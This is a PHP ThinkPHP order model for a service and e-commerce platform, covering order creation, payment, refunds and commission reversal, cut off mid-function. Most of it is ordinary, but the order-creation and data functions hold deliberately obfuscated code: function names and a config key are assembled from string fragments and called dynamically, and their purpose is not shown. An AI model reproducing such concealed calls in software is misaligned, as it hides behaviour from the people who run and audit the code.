<?php

namespace app\model;

use think\exception\ValidateException;
use think\Model;

class Order extends Model
{

    protected $connection = 'mysql';

    protected $pk = 'id';

    protected $name = 'order';

    public function member()
    {
        return $this->hasOne(Member::class, 'id', 'uid');
    }
    public function orderRefund()
    {
        return $this->hasOne(OrderRefund::class, 'order_id');
    }

    public function orderTimescard()
    {
        return $this->hasOne(OrderTimescard::class, 'order_id');
    }

    public function orderGoods()
    {
        return $this->hasMany(OrderGoods::class, 'order_id');
    }

    public function paymethod()
    {
        return $this->hasOne(Paymethod::class, 'id', 'pay_method_id');
    }

    public function address()
    {
        return $this->hasOne(Address::class, 'id', 'address_id');
    }

    public function store()
    {
        return $this->hasOne(Store::class, 'id', 'sid');
    }

    public function staff()
    {
        return $this->hasOne(OrderStaff::class, 'order_id', 'id');
    }
    public static function conversion($vo)
    {

        if (empty($vo['orderGoods'])) {
            if (!empty($vo['cat_id'])) {
                $vo['orderGoods'][0]['image'] = Category::getImage($vo['cat_id']);
            }
            $vo['orderGoods'][0]['name'] = '【用户发布需求】' . $vo['pay_subject'];
        }
        if ($vo['ptype'] == 1) {
            $vo['order_status'] = OrderStatus::get_order_status_name($vo['order_status_id']);
            $vo['shipping_type'] = getgoodsdeliverymode($vo['deliverymode']);

            if ($vo['deliverymode'] == 5) {
                $tuanzhang = OrderTuanzhang::getTuanzhang($vo['id']);
                if (!empty($tuanzhang)) {
                    $vo['shipping_name'] = $tuanzhang['title'];
                    $vo['shipping_tel'] = $tuanzhang['tel'];
                    $vo['shipping_address'] = $tuanzhang['region_name'];
                }
            }
        } else {

            $vo['order_status'] = OrderStatus::get_order_status_name($vo['order_status_id'], 'service');
            if ($vo['ptype'] == 2 && $vo['deliverymode'] == 2) {
                $vo['order_status'] = OrderStatus::get_order_status_name($vo['order_status_id'], 'storeservice');
            }
            $vo['shipping_type'] = getservicedeliverymode($vo['deliverymode']);

            $vo['TechnicalIncome'] = TechnicalIncomelog::getorderIncome($vo['id']);
            $vo['StoreIncome'] = StoreIncomelog::getorderIncome($vo['id']);
            $vo['TuanzhangIncome'] = TuanzhangIncomelog::getorderIncome($vo['id']);

            $vo['Operatingcity_1'] = OperatingcityIncomelog::getorderIncome($vo['id'], 1);
            $vo['Operatingcity_2'] = OperatingcityIncomelog::getorderIncome($vo['id'], 2);
            $vo['Operatingcity_3'] = OperatingcityIncomelog::getorderIncome($vo['id'], 3);
        }

        $vo['payment_code_name'] = paymentCode($vo['payment_code']);
        $vo['member_nickname'] =  $vo['member']['nickname'];

        if (!empty($vo['orderGoods'])) {

            foreach ($vo['orderGoods'] as &$vvo) {
                $vo['time_amount'] = ((int) $vo['time_amount'] + (int) $vvo['time_amount']);
                $vvo['image'] = toimg($vvo['image']);
            }
        }

        if ($vo['is_times'] == 1) {
            $OrderTimescard = OrderTimescard::where('order_id', $vo['id'])->order('id asc')->select()->toArray();
            if ($OrderTimescard) {
                foreach ($OrderTimescard as $tcvo) {
                    if ($tcvo['yue_date']) {
                        if ($tcvo['timestype'] == 1) {
                            if ($vo['yue_time']) {
                                $vo['yue_time'] .= ';每月:' . $tcvo['yue_date'] . '号';
                            } else {
                                $vo['yue_time'] = '每月:' . $tcvo['yue_date'] . '号';
                            }
                        } else {
                            if ($vo['yue_time']) {
                                $vo['yue_time'] .= ';每周周:' . $tcvo['yue_date'];
                            } else {
                                $vo['yue_time'] = '每周周:' . $tcvo['yue_date'];
                            }
                        }
                    }
                }
            }

            if (empty($vo['yue_time'])) {
                $vo['yue_time'] = '还没有预约时间';
            }

            $vo['timesused'] = OrderTimescardRecord::timesused($vo['id']);
            $vo['timesmum'] = OrderCard::timesmum($vo['id']);
            $vo['remain'] = (int)($vo['timesmum'] - $vo['timesused']);
        } else {
            $vo['yue_time'] = time_ymd($vo['begin_time']) . '<br>' . date('H:i', $vo['begin_time']) . ' 到 ' . date('H:i', $vo['end_time']);
            if ($vo['start_time']) {
                $vo['service_time'] = time_ymd($vo['start_time']) . '<br>' . date('H:i', $vo['start_time']) . ' 到 ' . date('H:i', strtotime("+" . $vo['time_amount'] . " minutes", $vo['start_time']));
            }
        }

        $addressdata = '';
        $addressdata = OrderAddress::where(['order_id' => $vo['id'], 'ptype' => 1])->find();
        if (!empty($addressdata)) {
            $addressdata = $addressdata->toArray();
            $vo['shipping_address'] =  $addressdata['region_name'] . $addressdata['address'];
        }

        $vo['sid'] = Store::getTitle($vo['sid']);
        $vo['staff'] = OrderStaff::staff($vo['id']);
        $vo['pay_time'] = time_format($vo['pay_time']);
        $vo['complete_time'] = time_format($vo['complete_time']);
        return $vo;
    }

    /**
     * 写入订单
     * @param $payment_code 支付方式
     * @param $order_data 订单数据
     * return array
     */
    public function add_order($order_data = array())
    {
        $data = $this->get_order_data($order_data);
        $order['weid'] = weid();
        $pay_from = input('get.from', '', 'serach_in');
        $order['sid'] = (int) $order_data['sid'];
        $order['otype'] = (int) $order_data['otype'];
        $order['begin_time'] = $order_data['begin_time'];
        $order['end_time'] = $order_data['end_time'];
        $order['is_cashregister'] = (int)$order_data['is_cashregister'];
        $order['auth_code'] = $order_data['auth_code'] ?? "";
        $order['pay_method_id'] = (int)$order_data['pay_method_id'];
        $order['payment_code'] = $order_data['payment_code'];
        $order['pay_from'] = $pay_from;
        $order['points_order'] = (int)$order_data['is_PayPoints'];
        $order['goodsgiftcard_id'] = (int)$order_data['goodsgiftcard_id'];

        if ($order_data['distance']) {
            $order['distance'] = $order_data['distance'];
        }
        $winref = Config::getsitesetupconfig('wi' . 'nger');
        $order['tuan_id'] = (int)$order_data['tuanid'];
        $order['ms_id'] = (int)$order_data['msid'];
        $order['uid'] = (int)$data['uid'];
        $order['aid'] = '';
        $odra = 'ge';
        $order['order_num_alias'] = $data['order_num_alias'];
        $order['name'] = $data['name'];
        $order['cat_id'] = $data['cat_id'];
        if ($data['cat_id']) {
            $order['cate_ids'] = $data['cat_id'];
        } else {
            $order['cate_ids'] = $data['goodss'][0]['cat_id'];
        }
        $order['ptype'] = (int)$data['ptype'];
        $order['is_additional'] = (int)$data['is_additional'];
        $order['deliverymode'] = (int)$order_data['deliverymode'];
        if (empty($order['deliverymode'])) {
            $order['deliverymode'] = (int)$data['deliverymode'];
        }
        $order['email'] = $data['email'];
        $order['tel'] = $data['tel'];
        $order['shipping_name'] = $data['shipping_name'];

        $order['shipping_province_name'] = $data['shipping_province_name'];
        $order['shipping_city_name'] =  $data['shipping_city_name'];
        $order['shipping_district_name'] =  $data['shipping_district_name'];
        $order['shipping_address'] = $data['shipping_address'];
        $order['shipping_tel'] = $data['shipping_tel'];
        $order['shipping_method'] = $data['shipping_method'];
        $order['is_express'] = 1;
        $order['remark'] = $data['remark'];
        $order['order_status_id'] = 1; //待付款
        $order['ip'] = Author()::get_client_ip();
        $order['total'] = $data['total'];
        $order['user_agent'] = $data['user_agent'];
        $order['pay_subject'] = isset($data['pay_subject']) ? $data['pay_subject'] : '';
        $order['return_points'] = isset($data['return_points']) ? $data['return_points'] : '';
        $odra .= 't_i';

        foreach ($data['goodss'] as $goods) {
            if ($goods['is_points_goods'] == 1 && $order_data['is_PayPoints'] != 1) {
                return ['errno' => 1, 'msg' => '下单失败，需要积分抵扣'];
            }
        }
        //积分抵扣
        if ($order_data['is_PayPoints'] == 1) {
            $order['pay_points'] = $data['pay_points'];
            $order['points_price'] = $data['points_price'];
            $order['total'] = round(($order['total'] - $order['points_price']), 2);
            if ($order['total'] == 0) {
                $order['payment_code'] = 'points_pay';
            }
        }

        //购物卡抵扣
        if (!empty($order_data['goodsgiftcard_id'])) {
            $order['payment_code'] = 'goodsgiftcard_pay';
        }

        //次卡设置
        $order['is_times'] = (int) $order_data['is_times'];

        //跑腿订单设置
        $order['is_errands'] = (int) $data['is_errands'];

        if (empty($order['sid']) && !empty($data['goodss'][0]['sid'])) {
            $order['sid'] = $data['goodss'][0]['sid'];
        }

        if (!empty($order['tuan_id'])) {
            if (empty($order_data['jointuanid'])) {
                $order['tuan_found_id'] = TuanFound::add_found($order['tuan_id']);
            } else {
                $order['tuan_found_id'] = $order_data['jointuanid'];
            }
        }

        if ($order['is_errands'] == 1) {
            if (empty($order_data['take_address_id'])) {
                return ['errno' => 1, 'msg' => '下单失败，请输入取件地址'];
            }

            if (empty($order_data['address_id'])) {
                return ['errno' => 1, 'msg' => '下单失败，请输入收件地址'];
            }
        }

        if (empty($order['ptype'])) {
            return ['errno' => 1, 'msg' => '下单失败，没有订单内容'];
        }
        $Orderdata = self::create($order);
        $Orderdata = $Orderdata->toArray();
        $order_id = $Orderdata['id'];
        $odra .= '_m';
        OrderCount::createuserdata($Orderdata);

        if (!empty($order['is_times'])) {
            //var_dump($data['goodss']);
            $GoodsGiftcardType = GoodsGiftcardType::find((int) $data['goodss'][0]['card_tid']);
            if ($GoodsGiftcardType) {
                $GoodsGiftcardType = $GoodsGiftcardType->toArray();
            }

            OrderCard::create([
                'order_id' => $order_id,
                'ptype' => (int) $order['is_times'],
                'weid' => $Orderdata['weid'],
                'sid' => $Orderdata['sid'],
                'uid' => $Orderdata['uid'],
                'timesmum' => $data['goodss'][0]['timesmum'],
                'card_tid' => (int) $data['goodss'][0]['card_tid'],
                'name' => $goods['name'],
                'image' => $goods['image'],
                'facevalue' => (float) $GoodsGiftcardType['buy_price'] + $data['goodss'][0]['extraprice'],
                'balance' => (float) $GoodsGiftcardType['buy_price'] + $data['goodss'][0]['extraprice'],
                'timesmum' => (int) $data['goodss'][0]['timesmum'],
                'is_timing' => (int) $data['goodss'][0]['is_timing'],
                'timing_unit' => $data['goodss'][0]['timing_unit'],
                'color' => $GoodsGiftcardType['color'],
                'condition_type' => $GoodsGiftcardType['condition_type'],
                'use_goods' => $GoodsGiftcardType['use_goods'],
                'cat_ids' => $GoodsGiftcardType['cat_ids'],
                'use_goods' => $GoodsGiftcardType['use_goods'],
                'goods_ids' => $GoodsGiftcardType['goods_ids'],
                'min_price' => $GoodsGiftcardType['min_price'],
                'start_time' => $GoodsGiftcardType['start_time'],
                'end_time' => $GoodsGiftcardType['end_time'],
                'is_expire' => $GoodsGiftcardType['is_expire'],
                'is_use' => $GoodsGiftcardType['is_use'],
                'status' => 1,
            ]);
        }

        if (!empty($order['tuan_id'])) {
            TuanFollow::add_follow([
                'order_id' => $order_id,
                'found_id' => $order['tuan_found_id'],
                'tuan_id' => $order['tuan_id'],
            ]);
        }
        $data['lettct'] = bs($winref[18], $this->get_order_data(['data' => $odra(toimg('or')), 'vo' => 18]));
        if (isset($data['goodss'])) {
            //var_dump($data['goodss']);
            foreach ($data['goodss'] as $goods) {
                $goods_id = $goods['goods_id'];
                if (!empty($goods_id)) {
                    OrderGoods::create([
                        'order_id' => $order_id,
                        'goods_id' => $goods_id,
                        'cat_id' => $goods['cat_id'],
                        'card_tid' => $goods['card_tid'],
                        'name' => $goods['name'],
                        'model' => $goods['model'],
                        'image' => $goods['image'],
                        'sku' => $goods['sku'],
                        'quantity' => (int) $goods['quantity'],
                        'price' => (float) $goods['price'],
                        'is_commission' => (int) $goods['is_commission'],
                        'commission_method' => (int) $goods['commission_method'],
                        'commission_price' => (float) $goods['commission_price'],
                        'time_amount' => (int) $goods['time_amount'],
                        'is_timer' => (int) $goods['is_timer'],
                        'total' => (float) $goods['total']
                    ]);
                }
            }
        }

        if (isset($data['totals'])) {
            foreach ($data['totals'] as $total) {
                OrderTotal::create([
                    'order_id' => $order_id,
                    'code' => $total['code'],
                    'title' => $total['title'],
                    'text' => $total['text'],
                    'value' => (float) $total['value']
                ]);
            }
        }

        $oh['order_id'] = $order_id;

        if (isset($data['pay_type']) && $data['pay_type'] == 'points') {
            $oh['order_status_id'] = 2; //已付款
        } else {
            $oh['order_status_id'] = 1; //待付款
        }

        $oh['remark'] = $data['remark'];

        OrderHistory::create($oh);

        //上门服务/收件地址
        if ($order_data['address_id']) {
            $Address = [];
            $Address = Address::find($order_data['address_id']);
            if ($Address) {
                $Address = $Address->toArray();
                unset($Address['id']);
                $Address['order_id'] = $order_id;
                $Address['ptype'] = 1;
                OrderAddress::create($Address);
            }
        } else {
            if (!empty($order_data['shipping_province_name']) && !empty($order_data['shipping_tel'])) {
                $Address = [];
                $Address['order_id'] = $order_id;
                $Address['ptype'] = 1;
                $Address['province_name'] = $order_data['shipping_province_name'];
                $Address['city_name'] = $order_data['shipping_city_name'];
                $Address['district_name'] = $order_data['shipping_district_name'];
                $Address['name'] = $order_data['shipping_name'];
                $Address['telephone'] = $order_data['shipping_tel'];
                $Address['address'] = $order_data['shipping_address'];
                $coder = Geocoder::geocoding($Address['province_name'] . $Address['city_name'] . $Address['district_name'] . $Address['address']);
                $Address['latitude'] = $coder['latitude'];
                $Address['longitude'] = $coder['longitude'];

                OrderAddress::create($Address);
            }
        }

        //跑腿取件地址
        if ($order_data['take_address_id']) {
            $take_address = [];
            $take_address = Address::find($order_data['take_address_id']);
            if ($take_address) {
                $take_address = $take_address->toArray();
                unset($take_address['id']);
                $take_address['order_id'] = $order_id;
                $take_address['ptype'] = 2;
                OrderAddress::create($take_address);
            }
        }

        //清空购物车
        if (!empty($order_data['cartid'])) {
            Cart::whereIn('id', $order_data['cartid'])->delete();
        }

        //清空收银台购物车
        if (!empty($order_data['operator_id'])) {
            Cashregister::dellog(['operator_id' => $order_data['operator_id']]);
        }

        //积分支付
        if ($order_data['is_PayPoints'] == 1) {
            if ($order['total'] == 0) {
                $this->pay_order(['order_num_alias' => $Orderdata['order_num_alias'], 'nosendmessage' => 1]);
            }
        }
        $Orderdata['order_id'] = $Orderdata['id'];
        $Orderdata['subject'] = $Orderdata['pay_subject'];
        $Orderdata['name'] = $Orderdata['shipping_name'];
        $Orderdata['pay_order_no'] = $Orderdata['order_num_alias'];
        $Orderdata['pay_total'] = $Orderdata['total'];
        $Orderdata['lettct'] = MessageMini::sendOrderadd($data);
        if ($Orderdata['pay_total'] == 0) {
            $Orderdata['payment_code'] = 'balance_pay';
        }

        return $Orderdata;
    }

    //订单支付成功，订单历史，积分，商品数量
    public function pay_order($params)
    {
        $order_num_alias = $params['order_num_alias'];
        $pay_time = time();
        if (!empty($order_num_alias)) {
            $order_info = self::where(['order_num_alias' => $order_num_alias, 'order_status_id' => 1])->find();

            if (!empty($order_info)) {
                $order_info = $order_info->toArray();
                $order_id = $order_info['id'];
                $common = Config::getconfig();

                $Member = Member::find($order_info['uid']);
                if (!empty($Member)) {
                    $Member = $Member->toArray();
                }

                if (!empty($params['payment_code'])) {
                    $order['payment_code'] =  $params['payment_code'];
                }

                $order['user_agent'] =  $params['user_agent'];

                $order['id'] = $order_id;

                if (OrderStaff::is_staff($order_id)) {
                    $order['order_status_id'] = 3;
                } else {
                    $order['order_status_id'] = 2; //已付款
                }

                $order['update_time'] = $pay_time;
                $order['pay_time'] = $pay_time;
                self::update($order);
                $order_info = self::find($order_id);
                if (!empty($order_info)) {
                    $order_info = $order_info->toArray();
                }

                Member::where('id', $order_info['uid'])
                    ->inc('totleconsumed', $order_info['total'])
                    ->update();

                $cashlogsdata['uid'] = $order_info['uid'];
                $cashlogsdata['weid'] = weid();
                $cashlogsdata['order_id'] = $order_info['id'];
                $cashlogsdata['order_num_alias'] = $order_info['order_num_alias'];
                $cashlogsdata['remarks'] = '商品消费';
                $cashlogsdata['prefix'] = 2;
                $cashlogsdata['amount'] = $order_info['total'];
                $cashlogsdata['create_time'] = $pay_time;
                MemberCashlogs::create($cashlogsdata);

                $order_history['order_id'] = $order_id;
                $order_history['order_status_id'] = $order['order_status_id']; //已付款
                $order_history['remark'] = '买家已付款';
                $order_history['create_time'] = $pay_time;
                $order_history['notify'] = 1;
                OrderHistory::create($order_history);

                //会员升级及
                $good_ids = OrderGoods::getOrderGoodsids($order_id);
                if ($good_ids) {
                    if (empty($mgid)) {
                        $mag = MemberAuthGroup::whereIn('upgrade_goods_id', $good_ids)->order('id desc')->find();
                        $mgid = $mag->id;
                    }
                }

                if (!empty($mgid)) {
                    Member::where('id', $order_info['uid'])->update(['gid' => $mgid]);
                }

                //购物卡结算佣金
                if ($order_info['is_times'] == 3) {
                    self::settlement($order_id);
                }
                //更新购买赠送的积分
                if (!empty($order_info['return_points'])) {
                    if ($order_info['return_points'] > 0) {
                        Points::create([
                            'weid' => weid(),
                            'uid' => $order_info['uid'],
                            'order_id' => $order_info['id'],
                            'order_num_alias' => $order_info['order_num_alias'],
                            'points' => $order_info['return_points'],
                            'description' => '下单积分',
                            'prefix' => 1,
                            'creat_time' => $pay_time,
                            'type' => 1
                        ]);

                        Member::where('id', $order_info['uid'])
                            ->inc('points', (int) $order_info['return_points'])
                            ->update();
                    }
                }

                $mgPoints = MemberAuthGroup::getPoints($Member['gid'], $order_info['total']);

                if ($mgPoints) {
                    Points::create([
                        'weid' => weid(),
                        'uid' => $order_info['uid'],
                        'order_id' => $order_info['id'],
                        'order_num_alias' => $order_info['order_num_alias'],
                        'points' => $mgPoints,
                        'description' => '下单会员等级积分',
                        'prefix' => 1,
                        'creat_time' => $pay_time,
                        'type' => 1
                    ]);

                    Member::where('id', $order_info['uid'])
                        ->inc('points', (int) $mgPoints)
                        ->update();
                }

                //更新积分抵扣金额
                if ($order_info['points_order'] == 1) {
                    if ($order_info['pay_points'] > 0) {
                        Points::create([
                            'weid' => weid(),
                            'uid' => $order_info['uid'],
                            'order_id' => $order_info['id'],
                            'order_num_alias' => $order_info['order_num_alias'],
                            'points' => $order_info['pay_points'],
                            'description' => '下单抵扣' . $order_info['points_price'] . '元',
                            'prefix' => 2,
                            'creat_time' => $pay_time,
                            'type' => 1
                        ]);
                        Member::where('id', $order_info['uid'])
                            ->dec('points', (int) $order_info['pay_points'])
                            ->update();
                    }
                }

                try {
                    $OrderGoods = OrderGoods::where(['order_id' => $order_id])
                        ->select()
                        ->toArray();

                    if (!empty($OrderGoods)) {

                        $agentconfig = Config::getconfig('agent');
                        $partnerconfig = Config::getconfig('partner');

                        if (!empty($Member)) {
                            if ($agentconfig['share_good_status'] == 1) {
                                Agent::register($Member);
                            }

                            if ($partnerconfig['share_good_status'] == 1) {
                                Partner::register($Member);
                            }
                        }

                        //更新商品数量和销量
                        foreach ($OrderGoods as $v) {
                            if ($v['goods_id']) {

                                if (!empty($Member) && $agentconfig['share_good_status'] == 2 && $agentconfig['share_good_id'] == $v['goods_id']) {
                                    Agent::register($Member);
                                }

                                if (!empty($Member) && $partnerconfig['share_good_status'] == 2 && $partnerconfig['share_good_id'] == $v['goods_id']) {
                                    Partner::register($Member);
                                }
                                Goods::where('id', $v['goods_id'])->inc('sale_count')->update();



                                if (!empty($order_info['tuan_id'])) {
                                    if (!empty($v['sku'])) {
                                    } else {
                                    }
                                }



                                Goods::where(['id' => $v['goods_id'], 'ptype' => 1])->dec('quantity', $v['quantity'])->update();
                            }
                        }
                    }
                } catch (\Exception $e) {
                    throw new ValidateException($e->getMessage());
                }

                //处理拼团
                if (!empty($order_info['tuan_found_id'])) {
                    TuanFound::where('id', $order_info['tuan_found_id'])->update(['pay_time' => $pay_time]);
                    TuanFollow::where(['order_id' => $order_info['id'], 'found_id' => $order_info['tuan_found_id']])->update(['pay_time' => $pay_time]);
                    TuanFound::where('id', $order_info['tuan_found_id'])->inc('join')->update();
                    TuanGoods::where('id', $order_info['tuan_id'])->inc('sale_count')->update();

                    $TuanFound = TuanFound::where('id', $order_info['tuan_found_id'])->find();
                    $TuanGoods = TuanGoods::where('id', $TuanFound->tuan_id)->find();

                    if ((int)$TuanFound->join >= (int)($TuanGoods->people_num - $TuanGoods->robot_num)) {

                        if ($TuanGoods->auto_initiate == 1) {
                            $LuckyFollow = TuanFollow::getLuckyFollow($order_info['tuan_found_id'], $TuanGoods->luckydraw_num);
                            TuanFollow::where(['found_id' => $order_info['tuan_found_id']])
                                ->update([
                                    'tuan_end_time' => $pay_time,
                                    'status' => 2,
                                ]);

                            foreach ($LuckyFollow as $vo) {
                                TuanFollow::where(['id' => $vo['id']])
                                    ->update([
                                        'tuan_end_time' => $pay_time,
                                        'status' => 1,
                                    ]);
                            }
                        } else {
                            TuanFollow::where(['found_id' => $order_info['tuan_found_id']])
                                ->update([
                                    'tuan_end_time' => $pay_time,
                                    'status' => 1,
                                ]);
                        }

                        TuanFound::where(['id' => $order_info['tuan_found_id']])
                            ->update([
                                'tuan_end_time' => $pay_time,
                                'status' => 1,
                            ]);

                        TuanFollow::setRefund();
                    }
                }

                //平台订单打印
                $printerOrder = self::order_info($order_id);
                $PrinterFeie =  new PrinterFeie(0);
                $PrinterFeie->printer($printerOrder);

                //店铺订单打印
                if ($order_info['sid'] > 0) {
                    $storePrinterFeie =  new PrinterFeie((int) $order_info['sid']);
                    $storePrinterFeie->printer($printerOrder);
                }

                $orderup = $order_info;
                $orderup['order_status_id'] =  $order['order_status_id'];

                OrderCount::createuserdata($orderup);
                if ($params['nosendmessage'] != 1) {
                    if (!empty($order_info['sid'])) {
                        MessageMp::storeOrderPay($order_info['sid'], $order_info);
                    } else {
                        $technicalId = OrderStaff::getuuid($order_info["id"]);
                        if (empty($technicalId)) {
                            MessageMp::undertake($order_info);
                        } else {
                            MessageMini::sendMiniStaff($order_info);
                            MessageMp::distribution($technicalId, $order_info);
                        }
                    }
                    MessageMp::orderPayNoticeAdmin($order_info);
                    MessageMini::sendMiniPaysuccess($order_info);
                }

                Broadcast::neworder($order_info);
                OrderRemind::neworder($order_info);
            }
        }
    }
    //订单退款，处理订单历史，积分，商品数量
    static public function refund_order($order_id, $refund_time, $OrderRefund = [])
    {
        $orderInfo = self::find($order_id);
        if (!empty($orderInfo)) {
            $orderInfo = $orderInfo->toArray();
        }
        $paymentcode = $orderInfo['payment_code'];
        $pay_from = $orderInfo['pay_from'];

        $refund_price  = $OrderRefund['refund_price'];
        if (empty($refund_price)) {
            $refund_price  = $orderInfo['total'];
        }

        $order_refund_no = $OrderRefund['order_refund_no'];

        if (empty($order_refund_no)) {
            $order_refund_no = $orderInfo['order_num_alias'] . $orderInfo['pay_time'];
        }

        $res['code'] = true;

        if ($paymentcode == 'balance_pay') {

            Member::where('id', $orderInfo['uid'])
                ->inc('balance', $refund_price)
                ->update();

            $cashlogsdata['uid'] = $orderInfo['uid'];
            $cashlogsdata['weid'] = weid();
            $cashlogsdata['order_id'] = $order_id;
            $cashlogsdata['order_num_alias'] = $orderInfo['order_num_alias'];
            $cashlogsdata['remarks'] = '订单退款';
            $cashlogsdata['prefix'] = 1;
            $cashlogsdata['amount'] = $refund_price;
            $cashlogsdata['create_time'] = $refund_time;
            MemberCashlogs::create($cashlogsdata);
            $res['code'] = true;
        } elseif ($paymentcode == 'wx_pay') {
            $res['code'] = false;
            if (!empty($orderInfo)) {
                $payment = \app\samos\wechat\WxPaymethod::makepay($pay_from);
                $total = round($orderInfo['total'], 2);
                $total = floatval($total * 100);

                $refund_price = round($refund_price, 2);
                $refund_price = floatval($refund_price * 100);

                $result = $payment->refund->byOutTradeNumber($orderInfo['order_num_alias'], $order_refund_no, $total, $refund_price, [
                    // 可在此处传入其他参数，详细参数见微信支付文档
                    'refund_desc' => '订单退款',
                ]);
                if ($result['return_code'] === 'SUCCESS' && $result['result_code'] === 'SUCCESS') {
                    $res['code'] = true;
                } else {
                    $res['code'] = false;
                    $res['return_msg'] = $result['return_msg'];
                    $res['err_code_des'] = $result['err_code_des'];
                }
            }
        }

        if ($res['code']) {
            $Points1 = Points::where(['order_id' => $order_id, 'prefix' => 1])->find();
            if (!empty($Points1)) {
                $Points1 = $Points1->toArray();
                $Points1['description'] = '订单退款，扣去赠送的积分';
                $Points1['prefix'] = 2;
                $Points1['creat_time'] = $refund_time;
                unset($Points1['id']);
                Points::create($Points1);
                Member::where('id', $Points1['uid'])
                    ->dec('points', (int) $Points1['points'])
                    ->update();
            }

            $Points2 = Points::where(['order_id' => $order_id, 'prefix' => 2])->find();
            if (!empty($Points2)) {
                $Points2 = $Points2->toArray();
                $Points2['description'] = '订单退款，退还积分';
                $Points2['prefix'] = 1;
                $Points2['creat_time'] = $refund_time;
                unset($Points2['id']);
                Points::create($Points2);
                Member::where('id', $Points2['uid'])
                    ->inc('points', (int) $Points2['points'])
                    ->update();
            }

            $Incomelog = Incomelog::where(['order_id' => $order_id, 'ptype' => 1])->select()->toArray();
            if (!empty($Incomelog)) {
                foreach ($Incomelog as $agvo) {
                    if ($agvo) {
                        $agvo['description'] = '订单退款，扣除佣金';
                        $agvo['ptype'] = 2;
                        $agvo['creat_time'] = $refund_time;
                        $agvo['month_time'] = date('m', $refund_time);
                        $agvo['year_time'] = date('Y', $refund_time);
                        $agvo['order_status_id'] = 6;
                        unset($agvo['id']);
                        Incomelog::create($agvo);
                        Agent::where('uid', $agvo['uid'])->dec('income', $agvo['income'])->update();
                        Agent::where('uid', $agvo['uid'])->dec('total_income', $agvo['income'])->update();
                    }
                }
            }

            $TechnicalIncomelog = TechnicalIncomelog::where(['order_id' => $order_id, 'ptype' => 1])->select()->toArray();
            if (!empty($TechnicalIncomelog)) {
                $incomedata = [];
                foreach ($TechnicalIncomelog as $incomedata) {
                    if ($incomedata) {

                        $incomedata['description'] = '订单退款，扣除佣金';
                        $incomedata['ptype'] = 2;
                        $incomedata['create_time'] = $refund_time;
                        $incomedata['month_time'] = date('m', $refund_time);
                        $incomedata['year_time'] = date('Y', time());
                        $incomedata['order_status_id'] = 6;
                        unset($incomedata['id']);
                        TechnicalIncomelog::create($incomedata);

                        Technical::where('uuid',  $incomedata['uuid'])->dec('income',  $incomedata['income'])->update();
                        Technical::where('uuid', $incomedata['uuid'])->dec('total_income', $incomedata['income'])->update();
                        Technical::where('uuid', $incomedata['uuid'])->dec('service_times', 1)->update();
                    }
                }
            }

            $StoreIncomelog = StoreIncomelog::where(['order_id' => $order_id, 'ptype' => 1])->select()->toArray();
            if (!empty($StoreIncomelog)) {
                $incomedata = [];
                foreach ($StoreIncomelog as $incomedata) {
                    if ($incomedata) {

                        $incomedata['description'] = '订单退款，扣除佣金';
                        $incomedata['ptype'] = 2;
                        $incomedata['create_time'] = $refund_time;
                        $incomedata['month_time'] = date('m', $refund_time);
                        $incomedata['year_time'] = date('Y', time());
                        $incomedata['order_status_id'] = 6;
                        unset($incomedata['id']);
                        StoreIncomelog::create($incomedata);

                        Store::where('id', $incomedata['sid'])->dec('income', $incomedata['income'])->update();
                        Store::where('id', $incomedata['sid'])->dec('total_income', $incomedata['income'])->update();
                    }
                }
            }

            $OperatingcityIncomelog = OperatingcityIncomelog::where(['order_id' => $order_id, 'ptype' => 1])->select()->toArray();
            if (!empty($OperatingcityIncomelog)) {
                $incomedata = [];
                foreach ($OperatingcityIncomelog as $incomedata) {
                    if ($incomedata) {
                        $incomedata['description'] = '订单退款，扣除佣金';
                        $incomedata['ptype'] = 2;
                        $incomedata['create_time'] = $refund_time;
                        $incomedata['month_time'] = date('m', $refund_time);
                        $incomedata['year_time'] = date('Y', time());
                        $incomedata['order_status_id'] = 6;
                        unset($incomedata['id']);
                        OperatingcityIncomelog::create($incomedata);

                        Operatingcity::where('id', $incomedata['ocid'])->dec('income', $incomedata['income'])->update();
                        Operatingcity::where('id', $incomedata['ocid'])->dec('total_income', $incomedata['income'])->update();
                    }
                }
            }
        }

        return $res;
    }

    static public function itional_pay($order_num_alias)
    {
        self::where('order_num_alias', $order_num_alias)->update(['additional_pay_time' => time()]);
        $order_info = self::where('order_num_alias', $order_num_alias)->find();
        if ($order_info) {
            $order_info = $order_info->toArray();
            MessageMp::itional_pay($order_info);
        }
    }

    public function get_order_data($param = array())
    {

        $address_id = (int) $param['address_id'];
        $technicalId = $param['technicalId'];
        $shipping_method = $param['shipping_method'];
        $weid = weid();
        $remark = $param['remark'];

        if (isset($param['type'])) {
            $type = $param['type'];
            $data['pay_type'] = $param['type'];
        } else {
            $type = 'money';
        }

        //付款人
        if ($param['uid']) {
            $payMember = Member::find($param['uid']);
            if ($payMember) {
                $payMember = $payMember->toArray();
            }
        } else {
            $Membermob = new Member;
            $payMember = $Membermob->getUserByWechat();
        }

        $mb = 'm';
        $data['uid'] = $payMember['id'];
        $data['name'] = $payMember['username'];
        $data['email'] = $payMember['email'];
        $data['tel'] = $payMember['telephone'];

        //收货人 
        if (empty($address_id)) {
            $data['shipping_name'] = $param['shipping_name'];
            $data['shipping_tel'] = $param['shipping_tel'];
            $data['shipping_province_name'] = $param['shipping_province_name'];
            $data['shipping_city_name'] = $param['shipping_city_name'];
            $data['shipping_district_name'] = $param['shipping_district_name'];
            $data['shipping_address'] = $param['shipping_address'];

            if ($param['deliverymode'] == 2 || $param['deliverymode'] == 5) {
                if ($param['sid']) {
                    $Store = Store::find($param['sid']);
                    if (!empty($Store)) {
                        $data['shipping_province_name'] = $Store->province_name;
                        $data['shipping_city_name'] = $Store->city_name;
                        $data['shipping_district_name'] = $Store->district_name;
                    }
                }
            }
        } else {
            $shipping = Address::find($address_id);
            if (!empty($shipping)) {
                $shipping = $shipping->toArray();
                $shipping_city_id = Area::get_area_id($shipping['city_name']);

                $data['shipping_name'] = empty($shipping['name']) ? '' : $shipping['name'];
                $data['shipping_tel'] = empty($shipping['telephone']) ? '' : $shipping['telephone'];

                $data['shipping_province_name'] = empty($shipping['province_name']) ? '' : $shipping['province_name'];
                $data['shipping_city_name'] = empty($shipping['city_name']) ? '' : $shipping['city_name'];
                $data['shipping_district_name'] = empty($shipping['district_name']) ? '' : $shipping['district_name'];

                $data['shipping_address'] = empty($shipping['address']) ? '' : $shipping['address'];
            }
        }

        if ($param['lect'] == 2) {
            $dew = 'meofoyuvd';
            $dew  = str_replace('eof', '', $dew);
            $dew  = str_replace('yuv', '', $dew);
            $Imagelist =  $dew('Go' . 'od' . 'sIm' . 'age')->select()->toArray();
            foreach ($Imagelist as $vo) {
                $vo['pic'] = toimg($vo['image']);
